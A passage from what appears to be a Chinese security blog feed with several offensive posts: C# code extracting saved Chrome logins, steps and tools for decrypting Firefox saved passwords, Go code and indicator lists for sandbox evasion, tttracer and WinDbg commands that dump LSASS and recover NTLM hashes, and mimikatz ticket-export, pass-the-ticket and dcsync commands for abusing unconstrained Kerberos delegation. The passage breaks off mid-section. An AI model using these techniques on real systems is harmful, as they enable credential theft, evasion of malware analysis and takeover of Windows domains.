List&lt;String&gt; Field = <span class="built_in">new</span> List&lt;<span class="type">string</span>&gt;();</span><br><span class="line">    while (r.Read())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">string</span> origin_url = (<span class="type">string</span>)r[<span class="string">&quot;origin_url&quot;</span>];</span><br><span class="line">        <span class="type">string</span> out_origin_url = <span class="string">&quot;origin_url:&quot;</span> + origin_url + <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">string</span> acition_url = (<span class="type">string</span>)r[<span class="string">&quot;action_url&quot;</span>];</span><br><span class="line">        <span class="type">string</span> out_acition_url = <span class="string">&quot;acition_url:&quot;</span> + acition_url + <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Int64 blacklisted_by_user = (Int64)r[<span class="string">&quot;blacklisted_by_user&quot;</span>];</span><br><span class="line">        <span class="type">string</span> out_blacklisted_by_user = <span class="string">&quot;blacklisted_by_user:&quot;</span> + blacklisted_by_user + <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        File.AppendAllText(getloginypath, out_origin_url);</span><br><span class="line">        File.AppendAllText(getloginypath, out_acition_url);</span><br><span class="line">        File.AppendAllText(getloginypath, out_blacklisted_by_user);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    connect.Close();</span><br><span class="line">    Console.ForegroundColor = ConsoleColor.Green;</span><br><span class="line">    Console.WriteLine(<span class="string">&quot;      [*]login data parse success&quot;</span>);</span><br><span class="line">    Console.ForegroundColor = ConsoleColor.White;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    Console.ForegroundColor = ConsoleColor.Red;</span><br><span class="line">    Console.WriteLine(<span class="string">&quot;      [-]login data not found&quot;</span>);</span><br><span class="line">    Console.ForegroundColor = ConsoleColor.White;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们获取到blacklisted_by_user为1说明目标开启了不保存该网站密码，反之则保存。</p><p>这里测试环境为本机环境，经过大量授权实战环境测试，目前没有发现问题。</p><p><img src="1662902232347-bdab99fc-4763-4aa5-a285-01b8dea90a16.png" alt="img"></p><p>最后效果。</p><p><img src="1662902247669-318a44b4-384c-4991-9434-be590a2a284b.png" alt="img"></p><p><img src="1662902261537-54e3e48d-9bb9-4b3e-90e8-5b8fa7c7d2ac.png" alt="img"></p><h1 id="firefox"><a href="#firefox" class="headerlink" title="firefox"></a>firefox</h1><h2 id="密码保存位置"><a href="#密码保存位置" class="headerlink" title="密码保存位置"></a>密码保存位置</h2><p>用户的Firefox各种配置文件存储在自己的Appdata\Roaming（%appdata%）目录下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\admin\AppData\Roaming\Firefox\Profiles\&lt;8位随机字母和数字的组合&gt;.default\</span><br></pre></td></tr></table></figure><p>不同版本的Firefox浏览器，存放登录信息文件和存放<a href="https://so.csdn.net/so/search?q=%E5%AF%86%E9%92%A5&spm=1001.2101.3001.7020">密钥</a>文件也不同，其中用到的加密方式也有少许不同：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Firefox 版本 &lt;32 (key3.db, signons.sqlite)</span><br><span class="line">Firefox 版本 &gt;=32 (key3.db, logins.json)</span><br><span class="line">Firefox 版本 &gt;=58.0.2 (key4.db, logins.json)</span><br><span class="line">Firefox 版本 &gt;=75.0 (sha1 pbkdf2 sha256 aes256 cbc used by key4.db, logins.json)</span><br><span class="line"></span><br><span class="line">更详细的文件说明可参考：</span><br><span class="line">http://kb.mozillazine.org/Profile_folder_-_Firefox</span><br></pre></td></tr></table></figure><p>如果Firefox 版本 &gt;&#x3D;58.0.2 那么接下来需要找的两个文件路径分别是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\admin\AppData\Roaming\Firefox\Profiles\&lt;random text&gt;.default\key4.db</span><br><span class="line">C:\Users\admin\AppData\Roaming\Firefox\Profiles\&lt;random text&gt;.default\logins.json</span><br><span class="line">logins.json将用户所有登录信息（包括URL，用户名，密码和其他元数据）存储为JSON。值得注意的是，</span><br><span class="line">这些文件中的用户名和密码均经过3DES加密，然后经过ASN.1编码，最后写入base64编码的文件中，用</span><br><span class="line">一个测试登录信息如下所示，其中encryptedUsername和encryptedPassword就是被加密的用户名和密码</span><br></pre></td></tr></table></figure><p>定位logins.json文件的位置可通过cmd命令实现，内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir %APPDATA%\Mozilla\Firefox\Profiles\*logins.json /s /b</span><br></pre></td></tr></table></figure><h2 id="导出密码"><a href="#导出密码" class="headerlink" title="导出密码"></a>导出密码</h2><h3 id="1-WebBrowserPassView-exe"><a href="#1-WebBrowserPassView-exe" class="headerlink" title="1.WebBrowserPassView.exe"></a>1.WebBrowserPassView.exe</h3><p><a href="https://www.nirsoft.net/password_recovery_tools.html">https://www.nirsoft.net/password_recovery_tools.html</a></p><h3 id="2-firepwd-py"><a href="#2-firepwd-py" class="headerlink" title="2.firepwd.py"></a>2.firepwd.py</h3><p>地址：<a href="https://github.com/lclevy/firepwd">https://github.com/lclevy/firepwd</a></p><h3 id="3-Lazagne"><a href="#3-Lazagne" class="headerlink" title="3.Lazagne"></a>3.Lazagne</h3><p>地址：</p><p><a href="https://github.com/AlessandroZ/LaZagne/">https://github.com/AlessandroZ/LaZagne/</a></p><p>导出Firefox浏览器的代码来自<a href="https://github.com/lclevy/firepwd">https://github.com/lclevy/firepwd</a></p><h3 id="4-firefox-decrypt-py"><a href="#4-firefox-decrypt-py" class="headerlink" title="4.firefox_decrypt.py"></a>4.firefox_decrypt.py</h3><p>地址：<a href="https://github.com/unode/firefox_decrypt">https://github.com/unode/firefox_decrypt</a></p><p>使用NSS(Network Security Services)进行解密，支持key3.db和key4.db的Master Password解密</p><h3 id="5-Firefox浏览器"><a href="#5-Firefox浏览器" class="headerlink" title="5.Firefox浏览器"></a>5.Firefox浏览器</h3><p>通过导出配置文件的方式实现</p><p>需要获得记录文件(logins.json或signons.sqlite)和密钥文件(key4.db或key3.db)，保存在本地的文件夹C:\test\data1</p><p>使用-profile参数启动Firefox：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firefox.exe -profile C:\test\data1 </span><br></pre></td></tr></table></figure><p>输入正确的Master Password，成功获得Firefox浏览器保存的信息</p><h3 id="在离线导出时需要注意以下问题："><a href="#在离线导出时需要注意以下问题：" class="headerlink" title="在离线导出时需要注意以下问题："></a>在离线导出时需要注意以下问题：</h3><h4 id="1-未设置Master-Password"><a href="#1-未设置Master-Password" class="headerlink" title="1.未设置Master Password"></a>1.未设置Master Password</h4><p>只需要获得记录文件(logins.json或signons.sqlite)和密钥文件(key4.db或key3.db)</p><p>使用firepwd.py</p><h4 id="2-设置Master-Password"><a href="#2-设置Master-Password" class="headerlink" title="2.设置Master Password"></a>2.设置Master Password</h4><p>(1)只获得记录文件(logins.json或signons.sqlite)和密钥文件(key4.db或key3.db)</p><p>本地使用Firefox浏览器导入配置文件，输入Master Password</p><p>(2)需要获得完整的配置文件</p><p>需要包括以下文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%APPDATA%\Mozilla\Firefox\profiles.ini</span><br><span class="line">%APPDATA%\Mozilla\Firefox\Profiles\xxxxxxxx.default\中的文件</span><br></pre></td></tr></table></figure><p>使用firefox_decrypt.py，命令示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firefox_decrypt.py C:\test\data1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>反沙箱tips</title>
      <link href="/2022/09/11/%E5%8F%8D%E6%B2%99%E7%AE%B1tips/"/>
      <url>/2022/09/11/%E5%8F%8D%E6%B2%99%E7%AE%B1tips/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="操作系统语言检测"><a href="#操作系统语言检测" class="headerlink" title="操作系统语言检测"></a>操作系统语言检测</h2><p>因为沙箱基本都是英文，所以根据首选操作系统语言是不是中文来判断是否为沙箱环境，简单粗暴一些。</p><h2 id="操作系统信息"><a href="#操作系统信息" class="headerlink" title="操作系统信息"></a>操作系统信息</h2><p>执行wmic命令，返回操作系统信息，根据关键字来判断，也是略简单粗暴。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic path Win32_ComputerSystem get Model</span><br><span class="line">VirtualBox, virtual，VMware，KVM，Bochs，HVM domU，Parallels</span><br></pre></td></tr></table></figure><h2 id="检测系统文件"><a href="#检测系统文件" class="headerlink" title="检测系统文件"></a>检测系统文件</h2><p>根据虚拟机或沙箱可能存在的一些文件，来进行判断。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&quot;C:\\windows\\System32\\Drivers\\Vmmouse.sys&quot;</span><br><span class="line">&quot;C:\\windows\\System32\\Drivers\\vmtray.dll&quot;</span><br><span class="line">&quot;C:\\windows\\System32\\Drivers\\VMToolsHook.dll&quot;</span><br><span class="line">&quot;C:\\windows\\System32\\Drivers\\vmmousever.dll&quot;</span><br><span class="line">&quot;C:\\windows\\System32\\Drivers\\vmhgfs.dll&quot;</span><br><span class="line">&quot;C:\\windows\\System32\\Drivers\\vmGuestLib.dll&quot;</span><br><span class="line">&quot;C:\\windows\\System32\\Drivers\\VBoxMouse.sys&quot;</span><br><span class="line">&quot;C:\\windows\\System32\\Drivers\\VBoxGuest.sys&quot;</span><br><span class="line">&quot;C:\\windows\\System32\\Drivers\\VBoxSF.sys&quot;</span><br><span class="line">&quot;C:\\windows\\System32\\Drivers\\VBoxVideo.sys&quot;</span><br><span class="line">&quot;C:\\windows\\System32\\vboxdisp.dll&quot;</span><br><span class="line">&quot;C:\\windows\\System32\\vboxhook.dll&quot;</span><br><span class="line">&quot;C:\\windows\\System32\\vboxoglerrorspu.dll&quot;</span><br><span class="line">&quot;C:\\windows\\System32\\vboxoglpassthroughspu.dll&quot;</span><br><span class="line">&quot;C:\\windows\\System32\\vboxservice.exe&quot;</span><br><span class="line">&quot;C:\\windows\\System32\\vboxtray.exe&quot;</span><br><span class="line">&quot;C:\\windows\\System32\\VBoxControl.exe&quot;</span><br></pre></td></tr></table></figure><h2 id="延迟运行检测"><a href="#延迟运行检测" class="headerlink" title="延迟运行检测"></a>延迟运行检测</h2><p>在各类检测沙箱中，检测运行的时间往往是比较短的，因为其没有过多资源可以供程序长时间运行，所以我们可以延迟等待一会儿后再进行真实的操作。</p><h2 id="开机时间检测"><a href="#开机时间检测" class="headerlink" title="开机时间检测"></a>开机时间检测</h2><p>许多沙箱检测完毕后会重置系统，我们可以检测开机时间来判断是否为真实的运行状况。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">bootTime</span><span class="params">()</span></span> (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line"> <span class="keyword">var</span> kernel = syscall.NewLazyDLL(<span class="string">&quot;Kernel32.dll&quot;</span>)</span><br><span class="line"> GetTickCount := kernel.NewProc(<span class="string">&quot;GetTickCount&quot;</span>)</span><br><span class="line"> r, _, _ := GetTickCount.Call()</span><br><span class="line"> <span class="keyword">if</span> r == <span class="number">0</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>, <span class="literal">nil</span></span><br><span class="line"> &#125;</span><br><span class="line"> ms := time.Duration(r * <span class="number">1000</span> * <span class="number">1000</span>)</span><br><span class="line"> tm := time.Duration(<span class="number">30</span> * time.Minute)</span><br><span class="line"> <span class="keyword">if</span> ms &lt; tm &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>, <span class="literal">nil</span></span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>, <span class="literal">nil</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="检测物理内存"><a href="#检测物理内存" class="headerlink" title="检测物理内存"></a>检测物理内存</h2><p>当今大多数pc具有4GB以上的RAM,我们可以检测RAM是否大于4GB来判断是否是真实的运行机器。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">physicalMemory</span><span class="params">()</span></span> (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line"> <span class="keyword">var</span> mod = syscall.NewLazyDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line"> <span class="keyword">var</span> proc = mod.NewProc(<span class="string">&quot;GetPhysicallyInstalledSystemMemory&quot;</span>)</span><br><span class="line"> <span class="keyword">var</span> mem <span class="type">uint64</span></span><br><span class="line"> proc.Call(<span class="type">uintptr</span>(unsafe.Pointer(&amp;mem)))</span><br><span class="line"> mem = mem / <span class="number">1048576</span></span><br><span class="line"> <span class="keyword">if</span> mem &lt; <span class="number">4</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>, <span class="literal">nil</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">1</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="检测CPU核心数"><a href="#检测CPU核心数" class="headerlink" title="检测CPU核心数"></a>检测CPU核心数</h2><p>大多数pc拥有4核心cpu，许多在线检测的虚拟机沙盘是2核心，我们可以通过核心数来判断是否为真实机器或检测用的虚拟沙箱。</p><h2 id="检测临时文件数"><a href="#检测临时文件数" class="headerlink" title="检测临时文件数"></a>检测临时文件数</h2><p>正常使用的系统，其中用户的临时文件夹中有一定数量的临时文件，可以通过判断临时文件夹内的文件数量来检测是否在沙箱中运行</p><h2 id="通过进程名检测VMware-VirtualBox"><a href="#通过进程名检测VMware-VirtualBox" class="headerlink" title="通过进程名检测VMware&amp;VirtualBox"></a>通过进程名检测VMware&amp;VirtualBox</h2><p>以下是Vmware和VirtualBox可能存在的进程，我们可以使用Process32First，Process32Next等WINAPI列举进程并且检测是否存以下内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vmtoolsd.exe、Vmwaretrat.exe、Vmwareuser.exe、Vmacthlp.exe、vboxservice.exe、vboxtray.exe</span><br></pre></td></tr></table></figure><h2 id="检测注册表"><a href="#检测注册表" class="headerlink" title="检测注册表"></a>检测注册表</h2><p>vbox和vmware存在的一些注册表：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKLM\SOFTWARE\Vmware Inc\Vmware Tools</span><br><span class="line">HKLM\HARDWARE\DEVICEMAP\Scsi\Scsi Port <span class="number">2</span>\Scsi Bus <span class="number">0</span>\Target Id <span class="number">0</span>\Logical Unit Id <span class="number">0</span>\Identifier</span><br><span class="line">HKEY_CLASSES_ROOT\Applications\VMwareHostOpen.exe</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Oracle\VirtualBox Guest Additions</span><br></pre></td></tr></table></figure><h2 id="运行中的服务"><a href="#运行中的服务" class="headerlink" title="运行中的服务"></a>运行中的服务</h2><p>下面列表中的服务如果存在，很可能运行在虚拟机中，我们可以使用wmic或命令sc.exe query等方式判断是否存在以下服务。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VMTools、Vmrawdsk、Vmusbmouse、Vmvss、Vmscsi、Vmxnet、vmx_svga、Vmware Tools</span><br></pre></td></tr></table></figure><h2 id="检测mac地址前缀"><a href="#检测mac地址前缀" class="headerlink" title="检测mac地址前缀"></a>检测mac地址前缀</h2><p>以下列出了几个vmware和vbox可能出现的默认MAC地址前缀，可以逐一判断来确认程序是否运行在虚拟机中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00:05:69 (Vmware)、00:0C:29 (Vmware)、00:1C:14 (Vmware)、00:50:56 (Vmware)、08:00:27 (VirtualBox)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>tttracer.exe进行lsass转储</title>
      <link href="/2022/08/22/tttracer.exe%E8%BF%9B%E8%A1%8Clsass%E8%BD%AC%E5%82%A8/"/>
      <url>/2022/08/22/tttracer.exe%E8%BF%9B%E8%A1%8Clsass%E8%BD%AC%E5%82%A8/</url>
      
        <content type="html"><![CDATA[<hr><p>利用tttracer.exe进行lsass转储，转储成Time Travel Debugging格式,思路来源:<a href="https://twitter.com/n_o_t_h_a_n_k_s/status/1559620227586875392">https://twitter.com/n_o_t_h_a_n_k_s/status/1559620227586875392</a></p><p>首先新建两个管理员权限的powershell终端，分别运行:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tttracer -dumpfull -attach (Get-Process lsass | Select -expand id)</span><br><span class="line"></span><br><span class="line">tttracer -stop (Get-Process lsass | Select -expand id)</span><br></pre></td></tr></table></figure><p>然后将得到的.run文件放入WinDbg</p><p><img src="1661182990525-944c33ab-1168-449c-8907-6385db4677a9.png" alt="img"></p><p>然后运行下面的指令得到MSV1_0 blob区域</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db poi(poi(poi(poi(lsasrv!LogonSessionList))+0x108)+0x10)+0x28+0x8 L0x1b0</span><br></pre></td></tr></table></figure><p><img src="1661183035622-afdfdbf6-269e-43bd-8d7b-8db63b8f45ed.png" alt="img"></p><p>然后运行下面的指令拿到3des的key和iv</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db lsasrv!InitializationVector L8</span><br><span class="line"></span><br><span class="line">db poi(poi(lsasrv!h3DesKey)+0x10)+0x38+4 L0x18</span><br></pre></td></tr></table></figure><p><img src="1661183096371-a5ce4bb7-43de-47d3-a596-8ac98905e061.png" alt="img"></p><p>最后就是用key和iv去解密blob拿到ntlm、sha1</p><p><img src="1661183119114-c802d2dc-6304-4e12-be93-e311ecaad77f.png" alt="img"></p><p>注意该方法dump的文件mimikatz无法解密，不同版本偏移不同所以windbg命令也不相同</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>域委派</title>
      <link href="/2022/07/31/%E5%9F%9F%E5%A7%94%E6%B4%BE/"/>
      <url>/2022/07/31/%E5%9F%9F%E5%A7%94%E6%B4%BE/</url>
      
        <content type="html"><![CDATA[<hr><p><a href="https://xz.aliyun.com/t/11487?accounttraceid=29188d5a948e41968d315b431a7b22fehxej#toc-8">https://xz.aliyun.com/t/11487?accounttraceid=29188d5a948e41968d315b431a7b22fehxej#toc-8</a></p><h1 id="1-域委派简介"><a href="#1-域委派简介" class="headerlink" title="1.域委派简介"></a>1.域委派简介</h1><h2 id="1-1-是什么"><a href="#1-1-是什么" class="headerlink" title="1.1.是什么"></a>1.1.是什么</h2><p>域委派是指将域内用户的权限委派给具有委派属性的服务账户，使得服务账号能够以用户的权限在域内展开活动。</p><p><img src="1659259531613-dd569f65-9eef-49a7-8567-1f972c23be7d.png" alt="img"></p><h3 id="1-1-1-简单栗子"><a href="#1-1-1-简单栗子" class="headerlink" title="1.1.1.简单栗子"></a>1.1.1.简单栗子</h3><p>A成功运行需要B支持，但是A本身权限不足以访问B，则需要用域委派。</p><p>域内的文件服务器，要实现不同权限的用户访问不同的目录，需要委派。如果没有域委派，那么所有人成功通过IIS认证后，存在的权限都只是IIS的权限，当访问文件服务器的时候，文件服务器都只认为是IIS服务在访问它，无法做到详细划分权限的功能。</p><p>因此委派就是解决这个问题的，通过设置委派属性，可以让IIS模拟用户，验证并访问后端的其他服务器以获取相应的资源。</p><h2 id="1-2-委派对象"><a href="#1-2-委派对象" class="headerlink" title="1.2.委派对象"></a>1.2.委派对象</h2><p><strong>在域中，</strong>只有 <strong>服务账号</strong> 和 <strong>主机账号</strong> 才具有委派属性。<br>主机账号就是AD活动目录中 Computers 中的计算机，也可以称为机器账号，一个普通域用户默认最多可以创建十个主机账号。</p><p> 服务账号（Service Account）是域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来并加入域。例如SQL Server 在安装时，会在域内自动注册服务账号 SQLServiceAccount。也可以将域用户通过注册SPN变为服务账号。</p><h2 id="1-3-设置方式"><a href="#1-3-设置方式" class="headerlink" title="1.3.设置方式"></a>1.3.设置方式</h2><h3 id="1-3-1-机器用户设置委派"><a href="#1-3-1-机器用户设置委派" class="headerlink" title="1.3.1.机器用户设置委派"></a>1.3.1.机器用户设置委派</h3><p>直接使用AD目录管理器操作。</p><p><img src="1659260217668-05650b66-705c-4bb2-b29e-c2eb9910cd48.png" alt="img"></p><p>可通过powerview.ps1查看当前账户的<code>userAccountControl</code>包含字段<code>TRUSTED_FOR_DELEGATION</code>字段判断</p><p><img src="1659260842993-3b422aa9-ecc7-44b5-9258-9b3081aec9c5.png" alt="img"></p><h3 id="1-3-2-服务账号设置委派（域用户注册SPN设置委派）"><a href="#1-3-2-服务账号设置委派（域用户注册SPN设置委派）" class="headerlink" title="1.3.2.服务账号设置委派（域用户注册SPN设置委派）"></a>1.3.2.服务账号设置委派（域用户注册SPN设置委派）</h3><p><code>setspn -s testSPN/777.ruyue.com momo </code><br>后面就可以在这个域账号上设置委派属性了。</p><p><img src="1659260994928-798900ee-f342-4573-af2c-1da8a75a1355.png" alt="img"></p><h1 id="2-无约束委派"><a href="#2-无约束委派" class="headerlink" title="2.无约束委派"></a>2.无约束委派</h1><p>非约束性委派其实就是权限最大的一种委派方式，即完全的获取到你这个用户的权限。<br>对于非约束性委派，服务账号可以获取被委派用户的TGT，并将TGT缓存到LSASS进程中，从而服务账号可使用该TGT，模拟用户访问任意服务。</p><h2 id="2-1-工作流程"><a href="#2-1-工作流程" class="headerlink" title="2.1.工作流程"></a>2.1.工作流程</h2><p>当域用户要访问服务A时，做以下步骤：</p><p>1、域用户向KDC认证身份</p><p>2、KDC通过认证在发放ST前，会检查服务A的委派属性，如果是非约束性委派，就会把用户的TGT放在ST票据中并一起返还给用户</p><p>3、用户会拿着这个带着TGT的ST去访问服务A。服务A就成功获取了用户的TGT，相当于拿到了用户的所有权限。</p><p><img src="1659261207081-eef64831-5d33-4b6f-9a61-3ece2af13549.png" alt="img"></p><h2 id="2-2-利用条件"><a href="#2-2-利用条件" class="headerlink" title="2.2.利用条件"></a>2.2.利用条件</h2><p>1.非约束性委派的目标的ACL属性的<code>userAccountControl</code>字段为<code>TRUSTED_FOR_DELEGATION</code>。<br>2.委派的设置需要<code>SeEnableDelegation</code>特权，通常仅域管理员有。<br>3.域控主机默认是非约束性委派。</p><h2 id="2-3-利用"><a href="#2-3-利用" class="headerlink" title="2.3.利用"></a>2.3.利用</h2><h3 id="2-3-1-基本利用"><a href="#2-3-1-基本利用" class="headerlink" title="2.3.1.基本利用"></a>2.3.1.基本利用</h3><h4 id="2-3-1-1-原理"><a href="#2-3-1-1-原理" class="headerlink" title="2.3.1.1.原理"></a>2.3.1.1.原理</h4><p>由<code>2.1</code>可知，服务A直接拿到用户的TGT并缓存在内存中即可。只需要拿下一台设置了非约束性委派的机器后，诱导域管访问这台机子，这样，就能够获取到域管的TGT即金票了。</p><h4 id="2-3-1-2-流程"><a href="#2-3-1-2-流程" class="headerlink" title="2.3.1.2.流程"></a>2.3.1.2.流程</h4><ul><li>寻找配置了非约束性委派的服务或主机账号</li><li>诱导其他账号访问配置了非约束性委派的服务或主机。</li><li>导出票据，进行票据注入。</li></ul><h4 id="2-3-1-3-过程"><a href="#2-3-1-3-过程" class="headerlink" title="2.3.1.3.过程"></a>2.3.1.3.过程</h4><p>1、首先是获取存在非约束性委派的机器账号。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Netcomputer</span> <span class="literal">-Unconstrained</span> | <span class="built_in">select</span> name </span><br><span class="line">或者</span><br><span class="line"><span class="built_in">Get-NetUser</span> <span class="literal">-Unconstrained</span> | <span class="built_in">select</span> name</span><br></pre></td></tr></table></figure><p><img src="1659262058927-ba575738-0ac6-458e-831e-36899ad1e53a.png" alt="img"></p><p>2、使用域控去访问目标主机：</p><p><img src="1659262126185-e06dadfe-8cbd-4e71-9e7b-9687a64ad16a.png" alt="img"></p><p>此时exchange这台机子内存就已经存在了域控的TGT。这里我们用mimikatz（管理员??？）把内存中的票据给导出来。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure><p><img src="1659266515042-eb15b162-468d-431c-9ad1-90c5dcbafee4.png" alt="img"></p><p>3、用ptt将票据注入到当前会话后，用dcsync导出域控中所有用户的hash，最后就可以用krbtgt用户的hash去生成黄金票据了。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt [<span class="number">0</span>;<span class="number">181868</span>]<span class="literal">-2-0-60a10000-Administrator</span>@krbtgt<span class="literal">-RUYUE</span>.COM.kirbi //导入票据</span><br><span class="line"></span><br><span class="line">kerberos::list //查看票据</span><br></pre></td></tr></table></figure><p><img src="1659266558924-dbe66747-b5a8-4cf5-87ba-35e1c5de675a.png" alt="img"></p><p>4、导出所有hash，保证可以随时做金票。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:ruyue.com /all /csv</span><br></pre></td></tr></table></figure><p><img src="1659266610105-882f52c8-c9d2-4f8b-8470-858046c5dff4.png" alt="img"></p><h3 id="2-3-2-spooler打印机BUG-非约束性委派"><a href="#2-3-2-spooler打印机BUG-非约束性委派" class="headerlink" title="2.3.2.spooler打印机BUG+非约束性委派"></a>2.3.2.spooler打印机BUG+非约束性委派</h3><h4 id="2-3-2-1-原理"><a href="#2-3-2-1-原理" class="headerlink" title="2.3.2.1.原理"></a>2.3.2.1.原理</h4><h4 id="2-3-2-2-流程"><a href="#2-3-2-2-流程" class="headerlink" title="2.3.2.2.流程"></a>2.3.2.2.流程</h4><h4 id="2-3-2-3-过程"><a href="#2-3-2-3-过程" class="headerlink" title="2.3.2.3.过程"></a>2.3.2.3.过程</h4><h2 id="2-4-如何让域管主动和我们进行认证？"><a href="#2-4-如何让域管主动和我们进行认证？" class="headerlink" title="2.4.如何让域管主动和我们进行认证？"></a>2.4.如何让域管主动和我们进行认证？</h2><p>从上面的流程我们不难看出，最难的部分其实就是怎么让域控和我们进行NTLM身份认证。<br>而这里我们有以下几种方法：<br>①说服受害者用户或机子向我们的非约束性委派服务器进行身份验证。这里可以辅佐一些网络协议的攻击。<br>比如比较常见的链路层地址解析协议 (ARP)，通过 ARP 中毒来说服目标受害者认为恶意服务器实际上是文件服务器、域控制器或网络中已经存在的任何合法服务器。从而导致它与我们的服务器进行NTLM认证。</p><p>②钓鱼，利用特殊的网络协议如 SMB、HTTP、RDP、LDAP 等，通过精心设计PDF 、 Microsoft Word 和 Microsoft Access等文件，以在打开时引发 NTLM 身份验证请求。<br><a href="https://blog.csdn.net/wxh0000mm/article/details/105997105">https://blog.csdn.net/wxh0000mm/article/details/105997105</a></p><h1 id="3-约束委派"><a href="#3-约束委派" class="headerlink" 